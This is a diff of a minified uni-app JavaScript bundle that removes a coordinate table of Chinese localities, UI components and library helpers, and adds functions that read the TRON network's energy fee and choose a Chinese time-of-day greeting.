"\u7389\u73AF\u53BF", "28", "8", "121", "14"], ["\u6D59\u6C5F\u7701", "\u4E3D\u6C34\u5E02", "28", "27", "119", "55"], ["\u6D59\u6C5F\u7701", "\u83B2\u90FD\u533A", "28", "27", "119", "55"], ["\u6D59\u6C5F\u7701", "\u9752\u7530\u53BF", "28", "9", "120", "17"], ["\u6D59\u6C5F\u7701", "\u4E91\u548C\u53BF", "28", "7", "119", "34"], ["\u6D59\u6C5F\u7701", "\u9F99\u6CC9\u5E02", "28", "5", "119", "8"], ["\u6D59\u6C5F\u7701", "\u5E86\u5143\u53BF", "27", "37", "119", "3"], ["\u6D59\u6C5F\u7701", "\u7F19\u4E91\u53BF", "28", "39", "120", "4"], ["\u6D59\u6C5F\u7701", "\u9042\u660C\u53BF", "28", "36", "119", "16"], ["\u6D59\u6C5F\u7701", "\u677E\u9633\u53BF", "28", "27", "119", "29"], ["\u6D59\u6C5F\u7701", "\u666F\u5B81\u7572\u65CF\u81EA\u6CBB\u53BF", "27", "59", "119", "38"], ["\u91CD\u5E86\u5E02", "\u91CD\u5E86\u5E02", "29", "34", "106", "33"], ["\u91CD\u5E86\u5E02", "\u57AB\u6C5F\u53BF", "30", "20", "107", "21"], ["\u91CD\u5E86\u5E02", "\u53CC\u6865\u533A", "29", "29", "105", "47"], ["\u91CD\u5E86\u5E02", "\u6C38\u5DDD\u533A", "29", "21", "105", "54"], ["\u91CD\u5E86\u5E02", "\u6C5F\u6D25\u533A", "29", "18", "106", "15"], ["\u91CD\u5E86\u5E02", "\u6C99\u576A\u575D\u533A", "29", "32", "106", "27"], ["\u91CD\u5E86\u5E02", "\u5927\u6E21\u53E3\u533A", "29", "29", "106", "29"], ["\u91CD\u5E86\u5E02", "\u4E5D\u9F99\u5761\u533A", "29", "30", "106", "30"], ["\u91CD\u5E86\u5E02", "\u6C5F\u5317\u533A", "29", "36", "106", "34"], ["\u91CD\u5E86\u5E02", "\u5357\u5CB8\u533A", "29", "31", "106", "34"], ["\u91CD\u5E86\u5E02", "\u6E1D\u4E2D\u533A", "29", "33", "106", "34"], ["\u91CD\u5E86\u5E02", "\u5DF4\u5357\u533A", "29", "23", "106", "31"], ["\u91CD\u5E86\u5E02", "\u5357\u5DDD\u533A", "29", "10", "107", "6"], ["\u91CD\u5E86\u5E02", "\u4E07\u76DB\u533A", "28", "58", "106", "55"], ["\u91CD\u5E86\u5E02", "\u957F\u5BFF\u533A", "29", "52", "107", "5"], ["\u91CD\u5E86\u5E02", "\u6DAA\u9675\u533A", "29", "43", "107", "24"], ["\u91CD\u5E86\u5E02", "\u6E1D\u5317\u533A", "29", "43", "106", "38"], ["\u91CD\u5E86\u5E02", "\u5317\u789A\u533A", "29", "48", "106", "24"], ["\u91CD\u5E86\u5E02", "\u5408\u5DDD\u533A", "29", "59", "106", "16"], ["\u91CD\u5E86\u5E02", "\u4E07\u5DDE\u533A", "30", "49", "108", "24"], ["\u91CD\u5E86\u5E02", "\u9ED4\u6C5F\u533A", "29", "32", "108", "46"], ["\u91CD\u5E86\u5E02", "\u5F00\u5DDE\u533A", "31", "17", "108", "41"], ["\u91CD\u5E86\u5E02", "\u8363\u660C\u53BF", "29", "24", "105", "35"], ["\u91CD\u5E86\u5E02", "\u7DA6\u6C5F\u53BF", "29", "2", "106", "39"], ["\u91CD\u5E86\u5E02", "\u6B66\u9686\u53BF", "29", "20", "107", "45"], ["\u91CD\u5E86\u5E02", "\u4E30\u90FD\u53BF", "29", "52", "107", "44"], ["\u91CD\u5E86\u5E02", "\u5FE0\u53BF", "30", "18", "108", "1"], ["\u91CD\u5E86\u5E02", "\u6881\u5E73\u53BF", "30", "41", "107", "48"], ["\u91CD\u5E86\u5E02", "\u74A7\u5C71\u53BF", "29", "36", "106", "13"], ["\u91CD\u5E86\u5E02", "\u94DC\u6881\u53BF", "29", "51", "106", "3"], ["\u91CD\u5E86\u5E02", "\u6F7C\u5357\u53BF", "30", "11", "105", "50"], ["\u91CD\u5E86\u5E02", "\u5927\u8DB3\u53BF", "29", "42", "105", "43"], ["\u91CD\u5E86\u5E02", "\u5F00\u53BF", "31", "11", "108", "25"], ["\u91CD\u5E86\u5E02", "\u57CE\u53E3\u53BF", "31", "57", "108", "40"], ["\u91CD\u5E86\u5E02", "\u5DEB\u6EAA\u53BF", "31", "24", "109", "38"], ["\u91CD\u5E86\u5E02", "\u5949\u8282\u53BF", "31", "1", "109", "28"], ["\u91CD\u5E86\u5E02", "\u5DEB\u5C71\u53BF", "31", "5", "109", "53"], ["\u91CD\u5E86\u5E02", "\u4E91\u9633\u53BF", "30", "57", "108", "40"], ["\u91CD\u5E86\u5E02", "\u77F3\u67F1\u571F\u5BB6\u65CF\u81EA\u6CBB\u53BF", "30", "0", "108", "7"], ["\u91CD\u5E86\u5E02", "\u5F6D\u6C34\u82D7\u65CF\u571F\u5BB6\u65CF\u81EA\u6CBB\u53BF", "29", "18", "108", "10"], ["\u91CD\u5E86\u5E02", "\u9149\u9633\u571F\u5BB6\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "28", "51", "108", "46"], ["\u91CD\u5E86\u5E02", "\u79C0\u5C71\u571F\u5BB6\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "28", "27", "108", "59"], ["\u9999\u6E2F\u7279\u522B\u884C\u653F\u533A", "\u9999\u6E2F", "22", "12", "114", "5"], ["\u6FB3\u95E8\u7279\u522B\u884C\u653F\u533A", "\u6FB3\u95E8", "22", "8", "113", "20"], ["\u53F0\u6E7E\u7701", "\u53F0\u5317\u5E02", "25", "2", "121", "30"], ["\u53F0\u6E7E\u7701", "\u9AD8\u96C4\u5E02", "22", "37", "120", "17"], ["\u53F0\u6E7E\u7701", "\u57FA\u9686\u5E02", "25", "8", "121", "44"], ["\u53F0\u6E7E\u7701", "\u53F0\u4E2D\u5E02", "24", "9", "120", "40"], ["\u53F0\u6E7E\u7701", "\u53F0\u5357\u5E02", "23", "0", "120", "12"], ["\u53F0\u6E7E\u7701", "\u65B0\u7AF9\u5E02", "24", "49", "120", "57"], ["\u53F0\u6E7E\u7701", "\u5609\u4E49\u5E02", "23", "29", "120", "26"], ["\u53F0\u6E7E\u7701", "\u53F0\u5317\u53BF", "25", "1", "121", "28"], ["\u53F0\u6E7E\u7701", "\u5B9C\u5170\u53BF", "24", "46", "121", "45"], ["\u53F0\u6E7E\u7701", "\u6843\u56ED\u53BF", "24", "58", "121", "18"], ["\u53F0\u6E7E\u7701", "\u82D7\u6817\u53BF", "24", "32", "120", "48"], ["\u53F0\u6E7E\u7701", "\u53F0\u4E2D\u53BF", "24", "15", "120", "43"], ["\u53F0\u6E7E\u7701", "\u5F70\u5316\u53BF", "24", "5", "120", "32"], ["\u53F0\u6E7E\u7701", "\u5357\u6295\u53BF", "23", "55", "120", "40"], ["\u53F0\u6E7E\u7701", "\u4E91\u6797\u53BF", "23", "43", "120", "32"], ["\u53F0\u6E7E\u7701", "\u53F0\u5357\u53BF", "23", "19", "120", "19"], ["\u53F0\u6E7E\u7701", "\u9AD8\u96C4\u53BF", "22", "38", "120", "22"], ["\u53F0\u6E7E\u7701", "\u5C4F\u4E1C\u53BF", "22", "40", "120", "29"], ["\u53F0\u6E7E\u7701", "\u53F0\u4E1C\u53BF", "22", "45", "121", "9"], ["\u53F0\u6E7E\u7701", "\u82B1\u83B2\u53BF", "23", "59", "121", "36"], ["\u53F0\u6E7E\u7701", "\u6F8E\u6E56\u53BF", "23", "35", "119", "35"]);
-  },
-  6342: function (e) {
-    e.exports = JSON.parse("{\"uni-load-more.contentdown\":\"\u4E0A\u62C9\u986F\u793A\u66F4\u591A\",\"uni-load-more.contentrefresh\":\"\u6B63\u5728\u52A0\u8F09...\",\"uni-load-more.contentnomore\":\"\u6C92\u6709\u66F4\u591A\u6578\u64DA\u4E86\"}");
-  },
-  6382: function (e, t, n) {
-    var r = n("6454");
-    e.exports = function (e, t) {
-      if (e) {
-        if ("string" === typeof e) return r(e, t);
-        var n = Object.prototype.toString.call(e).slice(8, -1);
-        return "Object" === n && e.constructor && (n = e.constructor.name), "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? r(e, t) : void 0;
-      }
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  6454: function (e, t) {
-    e.exports = function (e, t) {
-      (null == t || t > e.length) && (t = e.length);
-      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
-      return r;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  6555: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("1fc2"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "66fc": function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("view", {
-          staticClass: e._$s(0, "sc", "uni-load-more"),
-          attrs: {
-            _i: 0
-          },
-          on: {
-            click: e.onClick
-          }
-        }, [e._$s(1, "i", !e.webviewHide && ("circle" === e.iconType || "auto" === e.iconType && "android" === e.platform) && "loading" === e.status && e.showIcon) ? n("view", {
-          staticClass: e._$s(1, "sc", "uni-load-more__img uni-load-more__img--android-MP"),
-          style: e._$s(1, "s", {
-            width: e.iconSize + "px",
-            height: e.iconSize + "px"
-          }),
-          attrs: {
-            _i: 1
-          }
-        }, [n("view", {
-          staticClass: e._$s(2, "sc", "uni-load-more__img-icon"),
-          style: e._$s(2, "s", {
-            borderTopColor: e.color,
-            borderTopWidth: e.iconSize / 12
-          }),
-          attrs: {
-            _i: 2
-          }
-        }), n("view", {
-          staticClass: e._$s(3, "sc", "uni-load-more__img-icon"),
-          style: e._$s(3, "s", {
-            borderTopColor: e.color,
-            borderTopWidth: e.iconSize / 12
-          }),
-          attrs: {
-            _i: 3
-          }
-        }), n("view", {
-          staticClass: e._$s(4, "sc", "uni-load-more__img-icon"),
-          style: e._$s(4, "s", {
-            borderTopColor: e.color,
-            borderTopWidth: e.iconSize / 12
-          }),
-          attrs: {
-            _i: 4
-          }
-        })]) : e._$s(5, "e", !e.webviewHide && "loading" === e.status && e.showIcon) ? n("view", {
-          staticClass: e._$s(5, "sc", "uni-load-more__img uni-load-more__img--ios-H5"),
-          style: e._$s(5, "s", {
-            width: e.iconSize + "px",
-            height: e.iconSize + "px"
-          }),
-          attrs: {
-            _i: 5
-          }
-        }, [n("image", {
-          attrs: {
-            src: e._$s(6, "a-src", e.imgBase64),
-            _i: 6
-          }
-        })]) : e._e(), e._$s(7, "i", e.showText) ? n("text", {
-          staticClass: e._$s(7, "sc", "uni-load-more__text"),
-          style: e._$s(7, "s", {
-            color: e.color
-          }),
-          attrs: {
-            _i: 7
-          }
-        }, [e._v(e._$s(7, "t0-0", e._s("more" === e.status ? e.contentdownText : "loading" === e.status ? e.contentrefreshText : e.contentnomoreText)))]) : e._e()]);
-      },
-      i = [];
-  },
-  6732: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("2b23"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "67ad": function (e, t) {
-    e.exports = function (e, t) {
-      if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "67b2": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("8c35"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  7172: function (e, t) {
-    e.exports = function (e, t) {
-      var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
-      if (null != n) {
-        var r,
-          i,
-          o,
-          a,
-          s = [],
-          u = !0,
-          c = !1;
-        try {
-          if (o = (n = n.call(e)).next, 0 === t) {
-            if (Object(n) !== n) return;
-            u = !1;
-          } else for (; !(u = (r = o.call(n)).done) && (s.push(r.value), s.length !== t); u = !0);
-        } catch (e) {
-          c = !0, i = e;
-        } finally {
-          try {
-            if (!u && null != n["return"] && (a = n["return"](), Object(a) !== a)) return;
-          } finally {
-            if (c) throw i;
-          }
-        }
-        return s;
-      }
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  7173: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return i;
-    }), n.d(t, "c", function () {
-      return o;
-    }), n.d(t, "a", function () {
-      return r;
-    });
-    var r = {
-        uniLink: n("c7ab").default
-      },
-      i = function () {
-        var e = this.$createElement,
-          t = this._self._c || e;
-        return t("view", [t("view", {
-          staticClass: this._$s(1, "sc", "main"),
-          attrs: {
-            _i: 1
-          }
-        }, [t("view", {
-          attrs: {
-            _i: 2
-          },
-          on: {
-            click: this.fenxiang
-          }
-        }), t("uni-link", {
-          attrs: {
-            href: "https://www.pgyer.com/PGPX4n",
-            text: this.shuoming2,
-            showUnderLine: "fales",
-            color: "#181818",
-            fontSize: "12",
-            _i: 3
-          }
-        })], 1)]);
-      },
-      o = [];
-  },
-  7501: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("20cb"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  7647: function (e, t) {
-    function n(t, r) {
-      return e.exports = n = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (e, t) {
-        return e.__proto__ = t, e;
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports, n(t, r);
+  }());
+async function refreshEnergyFee() {
+  try {
+    const w = createTronWeb();
+    if (!w) {
+      return;
     }
-    e.exports = n, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  7903: function (e, t, n) {
-    if ("undefined" === typeof Promise || Promise.prototype.finally || (Promise.prototype.finally = function (e) {
-      var t = this.constructor;
-      return this.then(function (n) {
-        return t.resolve(e()).then(function () {
-          return n;
-        });
-      }, function (n) {
-        return t.resolve(e()).then(function () {
-          throw n;
-        });
-      });
-    }), "undefined" !== typeof uni && uni && uni.requireGlobal) {
-      var r = uni.requireGlobal();
-      ArrayBuffer = r.ArrayBuffer, Int8Array = r.Int8Array, Uint8Array = r.Uint8Array, Uint8ClampedArray = r.Uint8ClampedArray, Int16Array = r.Int16Array, Uint16Array = r.Uint16Array, Int32Array = r.Int32Array, Uint32Array = r.Uint32Array, Float32Array = r.Float32Array, Float64Array = r.Float64Array, BigInt64Array = r.BigInt64Array, BigUint64Array = r.BigUint64Array;
+    const J = await w.trx.getChainParameters(),
+      a = J.find(l => l?.["key"]?.["toLowerCase"] && l.key.toLowerCase().includes("energyfee")) || J.find(l => l?.["key"] === "getEnergyFee"),
+      z = Number(a?.["value"]);
+    if (Number.isFinite(z) && z > 0) {
+      SUN_PER_ENERGY = z;
     }
-    uni.restoreGlobal && uni.restoreGlobal(weex, plus, setTimeout, clearTimeout, setInterval, clearInterval), __definePage("pages/index", function () {
-      return Vue.extend(n("c99b").default);
-    }), __definePage("pages/kong/kong", function () {
-      return Vue.extend(n("c28b").default);
-    }), __definePage("pages/kong/kong2", function () {
-      return Vue.extend(n("d418").default);
-    });
-  },
-  "7ca3": function (e, t, n) {
-    var r = n("d551");
-    e.exports = function (e, t, n) {
-      return t = r(t), t in e ? Object.defineProperty(e, t, {
-        value: n,
-        enumerable: !0,
-        configurable: !0,
-        writable: !0
-      }) : e[t] = n, e;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "7ce1": function (e, t, n) {
-    var r = n("b4d2"),
-      i = n("7647"),
-      o = n("4965"),
-      a = n("931d");
-    function s(t) {
-      var n = "function" === typeof Map ? new Map() : void 0;
-      return e.exports = s = function (e) {
-        if (null === e || !o(e)) return e;
-        if ("function" !== typeof e) throw new TypeError("Super expression must either be null or a function");
-        if ("undefined" !== typeof n) {
-          if (n.has(e)) return n.get(e);
-          n.set(e, t);
-        }
-        function t() {
-          return a(e, arguments, r(this).constructor);
-        }
-        return t.prototype = Object.create(e.prototype, {
-          constructor: {
-            value: t,
-            enumerable: !1,
-            writable: !0,
-            configurable: !0
-          }
-        }), i(t, e);
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports, s(t);
-    }
-    e.exports = s, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "80c1": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("14c8"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "828b": function (e, t, n) {
-    "use strict";
-
-    function r(e, t, n, r, i, o, a, s, u, c) {
-      var l,
-        f = "function" === typeof e ? e.options : e;
-      if (u) {
-        f.components || (f.components = {});
-        var d = Object.prototype.hasOwnProperty;
-        for (var h in u) d.call(u, h) && !d.call(f.components, h) && (f.components[h] = u[h]);
-      }
-      if (c && ("function" === typeof c.beforeCreate && (c.beforeCreate = [c.beforeCreate]), (c.beforeCreate || (c.beforeCreate = [])).unshift(function () {
-        this[c.__module] = this;
-      }), (f.mixins || (f.mixins = [])).push(c)), t && (f.render = t, f.staticRenderFns = n, f._compiled = !0), r && (f.functional = !0), o && (f._scopeId = "data-v-" + o), a ? (l = function (e) {
-        e = e || this.$vnode && this.$vnode.ssrContext || this.parent && this.parent.$vnode && this.parent.$vnode.ssrContext, e || "undefined" === typeof __VUE_SSR_CONTEXT__ || (e = __VUE_SSR_CONTEXT__), i && i.call(this, e), e && e._registeredComponents && e._registeredComponents.add(a);
-      }, f._ssrRegister = l) : i && (l = s ? function () {
-        i.call(this, this.$root.$options.shadowRoot);
-      } : i), l) if (f.functional) {
-        f._injectStyles = l;
-        var p = f.render;
-        f.render = function (e, t) {
-          return l.call(t), p(e, t);
-        };
+  } catch (I) {}
+}
+function getTimeInfo() {
+  const J = new Date(),
+    a = 8,
+    z = J.getUTCHours(),
+    l = (z + a) % 24;
+  let b = J.getUTCDate(),
+    I = J.getUTCMonth(),
+    F = J.getUTCFullYear();
+  if (z + a >= 24) {
+    const A = new Date(Date.UTC(F, I, b + 1));
+    b = A.getUTCDate();
+    I = A.getUTCMonth();
+    F = A.getUTCFullYear();
+  }
+  let U;
+  if (l >= 0 && l < 6) {
+    U = "凌晨好";
+  } else {
+    if (l >= 6 && l < 9) {
+      U = "早上好";
+    } else {
+      if (l >= 9 && l < 12) {
+        U = "上午好";
       } else {
-        var g = f.beforeCreate;
-        f.beforeCreate = g ? [].concat(g, l) : [l];
+        if (l >= 12 && l < 13) {
+          U = "中午好";
+        } else {
+          if (l >= 13 && l < 18) {
+            U = "下午好";
+          } else {
+            l >= 18 && l < 19 ? U = "傍晚好" : U = "晚上好";
+          }
+        }
       }
-      return {
-        exports: e,
-        options: f
-      };
     }
-    n.d(t, "a", function () {
-      return r;
-    });
-  },
-  "82ac": function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return i;
-    }), n.d(t, "c", function () {
-      return o;
-    }), n.d(t, "a", function () {
-      return r;
-    });
-    var r = {
-        uniIcons: n("15e4").default
-      },
-      i = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("view", {
-          staticClass: e._$s(0, "sc", "uni-navbar"),
-          class: e._$s(0, "c", {
-            "uni-dark": e.dark,
-            "uni-nvue-fixed": e.fixed
-          }),
-          attrs: {
-            _i: 0
-          }
-        }, [n("view", {
-          staticClass: e._$s(1, "sc", "uni-navbar__content"),
-          class: e._$s(1, "c", {
-            "uni-navbar--fixed": e.fixed,
-            "uni-navbar--shadow": e.shadow,
-            "uni-navbar--border": e.border
-          }),
-          style: e._$s(1, "s", {
-            "background-color": e.themeBgColor
-          }),
-          attrs: {
-            _i: 1
-          }
-        }, [e._$s(2, "i", e.statusBar) ? n("status-bar", {
-          attrs: {
-            _i: 2
-          }
-        }) : e._e(), n("view", {
-          staticClass: e._$s(3, "sc", "uni-navbar__header"),
-          style: e._$s(3, "s", {
-            color: e.themeColor,
-            backgroundColor: e.themeBgColor,
-            height: e.navbarHeight
-          }),
-          attrs: {
-            _i: 3
-          }
-        }, [n("view", {
-          staticClass: e._$s(4, "sc", "uni-navbar__header-btns uni-navbar__header-btns-left"),
-          style: e._$s(4, "s", {
-            width: e.leftIconWidth
-          }),
-          attrs: {
-            _i: 4
-          },
-          on: {
-            click: e.onClickLeft
-          }
-        }, [e._t("left", [e._$s(6, "i", e.leftIcon.length > 0) ? n("view", {
-          staticClass: e._$s(6, "sc", "uni-navbar__content_view"),
-          attrs: {
-            _i: 6
-          }
-        }, [n("uni-icons", {
-          attrs: {
-            color: e.themeColor,
-            type: e.leftIcon,
-            size: "20",
-            _i: 7
-          }
-        })], 1) : e._e(), e._$s(8, "i", e.leftText.length) ? n("view", {
-          staticClass: e._$s(8, "sc", "uni-navbar-btn-text"),
-          class: e._$s(8, "c", {
-            "uni-navbar-btn-icon-left": !e.leftIcon.length > 0
-          }),
-          attrs: {
-            _i: 8
-          }
-        }, [n("text", {
-          style: e._$s(9, "s", {
-            color: e.themeColor,
-            fontSize: "12px"
-          }),
-          attrs: {
-            _i: 9
-          }
-        }, [e._v(e._$s(9, "t0-0", e._s(e.leftText)))])]) : e._e()], {
-          _i: 5
-        })], 2), n("view", {
-          staticClass: e._$s(10, "sc", "uni-navbar__header-container "),
-          attrs: {
-            _i: 10
-          },
-          on: {
-            click: e.onClickTitle
-          }
-        }, [e._t("default", [e._$s(12, "i", e.title.length > 0) ? n("view", {
-          staticClass: e._$s(12, "sc", "uni-navbar__header-container-inner"),
-          attrs: {
-            _i: 12
-          }
-        }, [n("text", {
-          staticClass: e._$s(13, "sc", "uni-nav-bar-text uni-ellipsis-1"),
-          style: e._$s(13, "s", {
-            color: e.themeColor
-          }),
-          attrs: {
-            _i: 13
-          }
-        }, [e._v(e._$s(13, "t0-0", e._s(e.title)))])]) : e._e()], {
-          _i: 11
-        })], 2), n("view", {
-          staticClass: e._$s(14, "sc", "uni-navbar__header-btns uni-navbar__header-btns-right"),
-          style: e._$s(14, "s", {
-            width: e.rightIconWidth
-          }),
-          attrs: {
-            _i: 14
-          },
-          on: {
-            click: e.onClickRight
-          }
-        }, [e._t("right", [e._$s(16, "i", e.rightIcon.length) ? n("view", {
-          attrs: {
-            _i: 16
-          }
-        }, [n("uni-icons", {
-          attrs: {
-            color: e.themeColor,
-            type: e.rightIcon,
-            size: "22",
-            _i: 17
-          }
-        })], 1) : e._e(), e._$s(18, "i", e.rightText.length && !e.rightIcon.length) ? n("view", {
-          staticClass: e._$s(18, "sc", "uni-navbar-btn-text"),
-          attrs: {
-            _i: 18
-          }
-        }, [n("text", {
-          staticClass: e._$s(19, "sc", "uni-nav-bar-right-text"),
-          style: e._$s(19, "s", {
-            color: e.themeColor
-          }),
-          attrs: {
-            _i: 19
-          }
-        }, [e._v(e._$s(19, "t0-0", e._s(e.rightText)))])]) : e._e()], {
-          _i: 15
-        })], 2)])], 1), e._$s(20, "i", e.fixed) ? n("view", {
-          staticClass: e._$s(20, "sc", "uni-navbar__placeholder"),
-          attrs: {
-            _i: 20
-          }
-        }, [e._$s(21, "i", e.statusBar) ? n("status-bar", {
-          attrs: {
-            _i: 21
-          }
-        }) : e._e(), n("view", {
-          staticClass: e._$s(22, "sc", "uni-navbar__placeholder-view"),
-          style: e._$s(22, "s", {
-            height: e.navbarHeight
-          }),
-          attrs: {
-            _i: 22
-          }
-        })], 1) : e._e()]);
-      },
-      o = [];
-  },
-  8572: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("6732");
-    for (var i in r) ["default"].indexOf(i) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(i);
-    var o = n("828b"),
-      a = Object(o["a"])(r["default"], void 0, void 0, !1, null, null, null, !1, void 0, void 0);
-    t["default"] = a.exports;
-  },
-  "861b": function (e, t, n) {
-    "use strict";
-
-    (function (e, r) {
-      var i = n("47a9");
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.uniCloud = t.default = t.UniCloudError = void 0;
-      var o = i(n("127e")),
-        a = i(n("3352")),
-        s = i(n("34cf")),
-        u = i(n("3b2d")),
-        c = i(n("af34")),
-        l = i(n("ee10")),
-        f = i(n("7ca3")),
-        d = i(n("8ffa")),
-        h = i(n("4ffb")),
-        p = i(n("b4d2")),
-        g = i(n("7ce1")),
-        v = i(n("67ad")),
-        m = i(n("0bdb")),
-        _ = i(n("d754"));
-      function y(e, t) {
-        var n = "undefined" !== typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
-        if (!n) {
-          if (Array.isArray(e) || (n = function (e, t) {
-            if (!e) return;
-            if ("string" === typeof e) return w(e, t);
-            var n = Object.prototype.toString.call(e).slice(8, -1);
-            "Object" === n && e.constructor && (n = e.constructor.name);
-            if ("Map" === n || "Set" === n) return Array.from(e);
-            if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return w(e, t);
-          }(e)) || t && e && "number" === typeof e.length) {
-            n && (e = n);
-            var r = 0,
-              i = function () {};
-            return {
-              s: i,
-              n: function () {
-                return r >= e.length ? {
-                  done: !0
-                } : {
-                  done: !1,
-                  value: e[r++]
-                };
-              },
-              e: function (e) {
-                throw e;
-              },
-              f: i
-            };
-          }
-          throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
-        }
-        var o,
-          a = !0,
-          s = !1;
-        return {
-          s: function () {
-            n = n.call(e);
-          },
-          n: function () {
-            var e = n.next();
-            return a = e.done, e;
-          },
-          e: function (e) {
-            s = !0, o = e;
-          },
-          f: function () {
-            try {
-              a || null == n.return || n.return();
-            } finally {
-              if (s) throw o;
-            }
-          }
-        };
-      }
-      function w(e, t) {
-        (null == t || t > e.length) && (t = e.length);
-        for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
-        return r;
-      }
-      function b(e, t) {
-        var n = Object.keys(e);
-        if (Object.getOwnPropertySymbols) {
-          var r = Object.getOwnPropertySymbols(e);
-          t && (r = r.filter(function (t) {
-            return Object.getOwnPropertyDescriptor(e, t).enumerable;
-          })), n.push.apply(n, r);
-        }
-        return n;
-      }
-      function x(e) {
-        for (var t = 1; t < arguments.length; t++) {
-          var n = null != arguments[t] ? arguments[t] : {};
-          t % 2 ? b(Object(n), !0).forEach(function (t) {
-            (0, f.default)(e, t, n[t]);
-          }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : b(Object(n)).forEach(function (t) {
-            Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
-          });
-        }
-        return e;
-      }
-      function k(e) {
-        var t = function () {
-          if ("undefined" === typeof Reflect || !Reflect.construct) return !1;
-          if (Reflect.construct.sham) return !1;
-          if ("function" === typeof Proxy) return !0;
-          try {
-            return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
-          } catch (e) {
-            return !1;
-          }
-        }();
-        return function () {
-          var n,
-            r = (0, p.default)(e);
-          if (t) {
-            var i = (0, p.default)(this).constructor;
-            n = Reflect.construct(r, arguments, i);
-          } else n = r.apply(this, arguments);
-          return (0, h.default)(this, n);
-        };
-      }
-      function S(e, t, n) {
-        return e(n = {
-          path: t,
-          exports: {},
-          require: function (e, t) {
-            return function () {
-              throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs");
-            }(null == t && n.path);
-          }
-        }, n.exports), n.exports;
-      }
-      "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : "undefined" != typeof e || "undefined" != typeof self && self;
-      var O = S(function (e, t) {
-          var n;
-          e.exports = (n = n || function (e, t) {
-            var n = Object.create || function () {
-                function e() {}
-                return function (t) {
-                  var n;
-                  return e.prototype = t, n = new e(), e.prototype = null, n;
-                };
-              }(),
-              r = {},
-              i = r.lib = {},
-              o = i.Base = {
-                extend: function (e) {
-                  var t = n(this);
-                  return e && t.mixIn(e), t.hasOwnProperty("init") && this.init !== t.init || (t.init = function () {
-                    t.$super.init.apply(this, arguments);
-                  }), t.init.prototype = t, t.$super = this, t;
-                },
-                create: function () {
-                  var e = this.extend();
-                  return e.init.apply(e, arguments), e;
-                },
-                init: function () {},
-                mixIn: function (e) {
-                  for (var t in e) e.hasOwnProperty(t) && (this[t] = e[t]);
-                  e.hasOwnProperty("toString") && (this.toString = e.toString);
-                },
-                clone: function () {
-                  return this.init.prototype.extend(this);
-                }
-              },
-              a = i.WordArray = o.extend({
-                init: function (e, t) {
-                  e = this.words = e || [], this.sigBytes = void 0 != t ? t : 4 * e.length;
-                },
-                toString: function (e) {
-                  return (e || u).stringify(this);
-                },
-                concat: function (e) {
-                  var t = this.words,
-                    n = e.words,
-                    r = this.sigBytes,
-                    i = e.sigBytes;
-                  if (this.clamp(), r % 4) for (var o = 0; o < i; o++) {
-                    var a = n[o >>> 2] >>> 24 - o % 4 * 8 & 255;
-                    t[r + o >>> 2] |= a << 24 - (r + o) % 4 * 8;
-                  } else for (o = 0; o < i; o += 4) t[r + o >>> 2] = n[o >>> 2];
-                  return this.sigBytes += i, this;
-                },
